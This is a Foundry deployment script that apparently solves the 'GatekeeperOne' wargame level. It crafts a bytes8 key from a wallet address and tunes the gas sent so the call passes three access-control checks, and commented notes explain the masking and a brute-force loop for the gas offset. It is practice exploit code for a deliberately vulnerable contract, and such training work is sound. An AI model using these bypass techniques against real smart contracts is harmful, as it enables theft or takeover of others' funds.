// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";
import "../src/GateKeeperOne.sol";
import {console} from "../lib/forge-std/src/console.sol";

contract GateKeeperOneScriptContract is Script {

    // modifier gateThree(bytes8 _gateKey) {
    //     require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    //          >> means : _gate[32-16] is 0
    //     require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    //          >> means : _gate[64-32] != 0
    //     require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    //          >> means : _gate[1-16] = EOA[0-16] ， EOA ： 0xcd3169acB437745ee541Cf285F466800aC25EdF1
    //     _;
    // }

    function run() external {
        bytes8 _gateKey = bytes8(uint64(0x100000000000EdF1));
        vm.startBroadcast();
        GateKeeperOneMediator gkom = new GateKeeperOneMediator();
        // TIP ： use this to find the correct answer , it is 7593
        // for (uint i = 0; i < 8200; i++) {
        //     try gkom.enter{gas : 80000}(50000 + i, _gateKey) {
        //         console.log("correct i is : " , i);
        //     } catch {
                
        //     }
        // }
        // TIP : make sure that gas is enough
        bool result = gkom.enter{gas : 1000000}(50000 + 7593 + 8191, _gateKey);
        vm.stopBroadcast();
        console.log("result : ", result);
    }
}